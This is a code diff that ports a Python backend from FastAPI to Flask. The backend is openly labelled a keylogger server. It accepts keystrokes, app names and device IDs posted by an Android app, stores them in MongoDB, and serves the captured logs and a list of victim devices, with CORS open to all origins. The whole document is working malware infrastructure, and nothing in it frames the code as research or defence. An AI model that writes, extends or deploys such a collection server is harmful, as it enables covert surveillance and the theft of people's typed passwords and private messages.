@@ -1,88 +1,66 @@
-from fastapi import FastAPI, HTTPException
-from fastapi.middleware.cors import CORSMiddleware
-from pydantic import BaseModel
-from typing import Optional
+from flask import Flask, request, jsonify
+from flask_cors import CORS
 from datetime import datetime
 import os
 from dotenv import load_dotenv
-import motor.motor_asyncio
-from bson import ObjectId
+import pymongo
 
 load_dotenv()
 
-app = FastAPI(title="Keylogger Backend")
-
-# CORS settings - Allow all origins for testing
-app.add_middleware(
-    CORSMiddleware,
-    allow_origins=["*"],
-    allow_credentials=True,
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+app = Flask(__name__)
+CORS(app)  # Allow all origins
 
 # MongoDB connection
 MONGO_URI = os.getenv("MONGO_URI", "mongodb://localhost:27017")
-client = motor.motor_asyncio.AsyncIOMotorClient(MONGO_URI)
+client = pymongo.MongoClient(MONGO_URI)
 database = client.keylogger_db
 logs_collection = database.keylogs
 
-# Models
-class KeylogEntry(BaseModel):
-    appName: str
-    keystrokes: str
-    deviceId: str
-    timestamp: Optional[datetime] = None
-
-# Routes
-@app.get("/")
-async def root():
+@app.route('/')
+def root():
     return {"message": "Keylogger API is running", "status": "active"}
 
-@app.post("/api/keylog")
-async def receive_keystroke(entry: KeylogEntry):
+@app.route('/api/keylog', methods=['POST'])
+def receive_keystroke():
     """Receive keystrokes from the Android app"""
     try:
-        if not entry.timestamp:
-            entry.timestamp = datetime.now()
-        
-        result = await logs_collection.insert_one(entry.dict())
-        return {
+        data = request.json
+        data['timestamp'] = data.get('timestamp', datetime.now())
+        result = logs_collection.insert_one(data)
+        return jsonify({
             "success": True,
             "id": str(result.inserted_id),
             "message": "Keystrokes saved successfully"
-        }
+        })
     except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
+        return jsonify({"error": str(e)}), 500
 
-@app.get("/api/logs")
-async def get_logs(limit: int = 100):
+@app.route('/api/logs')
+def get_logs():
     """Get recent keystroke logs"""
     try:
-        cursor = logs_collection.find().sort("timestamp", -1).limit(limit)
-        logs = []
-        async for doc in cursor:
-            doc["id"] = str(doc["_id"])
-            del doc["_id"]
-            logs.append(doc)
-        return logs
+        limit = request.args.get('limit', 100, type=int)
+        logs = list(logs_collection.find().sort('timestamp', -1).limit(limit))
+        for log in logs:
+            log['id'] = str(log['_id'])
+            del log['_id']
+        return jsonify(logs)
     except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
+        return jsonify({"error": str(e)}), 500
 
-@app.get("/api/stats")
-async def get_stats():
+@app.route('/api/stats')
+def get_stats():
     """Get basic statistics"""
     try:
-        total = await logs_collection.count_documents({})
-        devices = await logs_collection.distinct("deviceId")
-        return {
+        total = logs_collection.count_documents({})
+        devices = logs_collection.distinct('deviceId')
+        return jsonify({
             "total_keystrokes": total,
             "unique_devices": len(devices),
             "devices": devices
-        }
+        })
     except Exception as e:
-        raise HTTPException(status_code=500, detail=str(e))
+        return jsonify({"error": str(e)}), 500
 
 if __name__ == "__main__":
-    import uvicorn
-    uvicorn.run(app, host="0.0.0.0", port=8000)
+    app.run(host="0.0.0.0", port=8000)
